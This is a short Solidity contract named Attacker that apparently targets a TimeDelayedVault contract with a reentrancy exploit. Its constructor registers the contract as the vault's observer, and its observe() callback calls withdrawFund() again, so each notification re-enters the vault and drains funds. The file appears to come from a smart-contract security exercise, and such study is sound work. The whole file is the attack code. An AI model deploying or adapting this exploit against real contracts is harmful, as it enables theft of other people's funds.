pragma solidity ^0.4.17;

import './TimeDelayedVault.sol';

contract Attacker {

    uint count;
    TimeDelayedVault timeDelayedVault;

    function Attacker(address daoAddress) payable {
        timeDelayedVault = TimeDelayedVault(daoAddress);
        timeDelayedVault.setObserver(address(this));
    }

    function observe() {
        timeDelayedVault.withdrawFund();
    }
}
